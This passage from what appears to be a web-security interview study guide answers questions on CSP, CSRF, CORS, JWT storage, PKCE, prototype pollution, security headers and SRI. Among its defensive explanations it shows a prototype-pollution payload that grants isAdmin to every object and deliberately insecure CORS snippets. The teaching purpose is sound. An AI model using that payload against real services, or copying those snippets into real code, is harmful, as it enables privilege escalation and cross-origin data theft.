unsanitized strings from reaching DOM sinks.

Universal defenses: CSP (blocks execution of injected scripts), output encoding,
input validation, DOMPurify for rich text.
```

---

**Q: How does CSP prevent XSS? What's the difference between nonce-based and hash-based CSP?**

```text
A:
CSP is an HTTP header that tells the browser which sources are allowed to load
scripts, styles, and other resources. Even if an attacker injects a <script> tag,
the browser won't execute it unless it came from a whitelisted source.

Nonce-based: server generates a random value per request, includes it in the CSP header
(script-src 'nonce-abc123') and as an attribute on legitimate inline scripts
(script nonce="abc123"). Browser only runs inline scripts with a matching nonce.
Good for: SSR apps where inline scripts are generated per-request.

Hash-based: server computes SHA-256 of the inline script content, includes it in CSP
(script-src 'sha256-<hash>'). Browser hashes the inline script and compares.
Good for: static sites with fixed inline scripts that don't change often.

Common mistake: using 'unsafe-inline' in script-src. This completely defeats inline XSS
protection — any injected inline script will execute. Use nonces or hashes instead.
```

---

**Q: Explain CSRF. How does SameSite=Lax prevent it?**

```text
A:
CSRF exploits the browser's automatic cookie attachment. An attacker on evil.com
creates a form or image that triggers a request to yourapp.com. Because the user
is logged in to yourapp.com, their session cookie is automatically attached.
The server sees an authenticated request but the user didn't intentionally send it.

SameSite=Lax prevents this by restricting when cookies are sent:
- Cookies are NOT sent on cross-site sub-requests (form submissions, fetch, XHR, img, iframe)
- Cookies ARE sent on top-level navigations (clicking a link that navigates the page)

So when evil.com tries to auto-submit a form to yourapp.com, the session cookie is
not attached → server sees unauthenticated request → rejects it.

An attacker could trick a user into clicking a link to yourapp.com/transfer-money (GET),
which would include the cookie with Lax. This is why:
1. Don't use GET for state-changing operations (idempotent/read only)
2. CSRF tokens as additional defense for sensitive forms
3. SameSite=Strict for highest security (auth flows, banking)

Modern advice: SameSite=Lax + CSRF tokens for forms + JSON APIs with custom
Authorization header (which require CORS preflight and block cross-origin requests).
```

---

**Q: What's the difference between CORS and the Same-Origin Policy? Can CORS be a security vulnerability?**

```text
A:
Same-Origin Policy (SOP) is the browser's default security model: JavaScript in one
origin cannot read responses from another origin. This prevents attacker.com from
using fetch() to read your bank's API response.

CORS is a mechanism to RELAX SOP for specific trusted origins. The server declares
which origins can read its responses via Access-Control-Allow-Origin.

Yes, CORS misconfiguration IS a security vulnerability:

1. Reflecting any Origin without validation:
   if (req.headers.origin) res.header('Access-Control-Allow-Origin', req.headers.origin)
   → Allows any site to read your API. Equivalent to *.

2. Wildcard with credentials:
   Access-Control-Allow-Origin: *  +  Access-Control-Allow-Credentials: true
   → Invalid per spec, but some implementations accept it — allows any site to
     make credentialed requests to your API.

3. Overly broad regex:
   if (origin.match(/myapp/)) → "evil-myapp.com" would match.

The key insight: CORS does NOT add security — it removes security (SOP) in a
controlled way. Misconfigured CORS makes you LESS secure than no CORS header at all.
```

---

**Q: Where should you store JWT tokens in a browser app? What are the tradeoffs?**

```text
A:
localStorage: easy but vulnerable to XSS. Any script on your page can read
localStorage.getItem('jwt'). If you have even one XSS vulnerability anywhere,
attackers can steal tokens. Avoid for long-lived, sensitive tokens.

httpOnly cookie: JS cannot read it (not via document.cookie, not via any JS).
XSS cannot steal it. Sent automatically with requests.
Risk: CSRF — mitigated by SameSite=Lax + CSRF tokens.
This is generally the recommended approach.

In-memory (React state/module variable): not accessible to XSS (typically).
Lost on page refresh — requires refresh token mechanism to restore.
Combined with httpOnly refresh token cookie, this is the gold standard:
  Access token (15 min): in memory — XSS gets it briefly but cannot persist
  Refresh token (7 days): httpOnly cookie — XSS cannot steal it
  On page load: POST /auth/refresh → get new access token into memory

sessionStorage: slightly better than localStorage (clears on tab close) but
still readable by XSS. Not meaningfully safer in practice.

Bottom line: httpOnly + Secure + SameSite=Lax cookie for tokens.
For SPAs needing OAuth: in-memory access token + httpOnly refresh token cookie.
```

---

**Q: What is the Authorization Code + PKCE flow? Why was Implicit flow deprecated?**

```text
A:
Implicit flow returned access tokens in the URL fragment (#access_token=xyz).
Problems: tokens in browser history, Referer headers, server logs;
no refresh tokens; no PKCE support; no way to verify token binding.
Now deprecated by OAuth Security BCP.

Authorization Code + PKCE:
1. App generates a random "code verifier" and its SHA-256 hash (code_challenge).
2. App sends user to the AS with the code_challenge (not the verifier).
3. AS returns a short-lived code — not a token.
4. App exchanges the code for tokens, sending the original code_verifier.
5. AS verifies: SHA256(verifier) === stored challenge. Only the app that initiated
   the flow has the verifier. Intercepted codes are useless without it.

This is safe even for public clients (SPAs) with no client secret, because the
code_verifier serves as a proof that the requester initiated the original flow.
```

---

**Q: What is prototype pollution and how do you defend against it?**

```text
A:
Every JavaScript object inherits from Object.prototype. If an attacker can set
properties on Object.prototype, those properties appear on ALL objects in the process.

Attack: a naive deep merge function processes user input like:
  { "__proto__": { "isAdmin": true } }
Since target.__proto__ is Object.prototype, every subsequent object has isAdmin = true.
Auth checks like (if user.isAdmin) now pass for all users.

Defenses:
1. Guard keys in merge functions: skip __proto__, constructor, prototype keys.
2. Use Object.create(null) for maps that hold user-supplied data — these objects
   have no prototype, so there's nothing to pollute.
3. Use structuredClone() or JSON.parse(JSON.stringify()) to copy — drops prototype.
4. Use well-maintained libraries for deep merge (lodash >= 4.17.21, patched).
5. Object.freeze(Object.prototype) — prevents any modification (drastic, may break libraries).
6. Use Map instead of plain objects for user-controlled key-value data.

In Node.js server context: prototype pollution can affect request parsing, template
rendering, and any server-side object. It's not just a client-side issue.
```

---

**Q: What security headers should every production web app have? What does each one do?**

```text
A:
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
  → Tells browsers to always use HTTPS for this domain. Prevents protocol downgrade attacks.

X-Content-Type-Options: nosniff
  → Prevents MIME-type sniffing. Browser respects declared Content-Type, doesn't execute
    a .txt file as JavaScript based on its content.

Content-Security-Policy: default-src 'self'; ...
  → Restricts sources for scripts, styles, images, connections. Blocks most XSS.

X-Frame-Options: DENY  (or use CSP frame-ancestors)
  → Prevents your page from being embedded in iframes. Blocks clickjacking.

Referrer-Policy: strict-origin-when-cross-origin
  → Controls what's in the Referer header. Prevents URL path leakage to third parties.

Permissions-Policy: camera=(), microphone=()
  → Restricts which browser APIs (camera, mic, geolocation) your page can use.
    Defense-in-depth if XSS occurs.

Cross-Origin-Opener-Policy: same-origin-allow-popups
  → Isolates browsing context. Required (with COEP) for SharedArrayBuffer.
    Prevents Spectre-style cross-window attacks.

In Express: npm install helmet then app.use(helmet()) sets most of these.
Always configure CSP explicitly — don't rely on helmet's default (it may not suit your app).
```

---

**Q: What is SRI and when should you use it?**

```text
A:
Subresource Integrity: integrity attribute on <script> and <link> tags that contains
a cryptographic hash of the expected file content.

<script src="https://cdn.example.com/lib.js" integrity="sha384-<hash>" crossorigin="anonymous">

When the browser fetches the resource, it hashes the content and compares to the
integrity attribute. If they don't match (CDN was compromised, file was modified),
the browser refuses to execute/apply the resource.

Use for: any script or stylesheet loaded from a third-party CDN.
Not needed for: resources from your own origin (you control the server).

Important: crossorigin="anonymous" is required on the tag — SRI requires CORS
to check the hash (needs to read the response body as a string).

Generate hashes: openssl dgst -binary -sha384 file.js | openssl base64 -A
Or use tooling: srihash.org, webpack-subresource-integrity plugin, Vite SRI plugin.
```
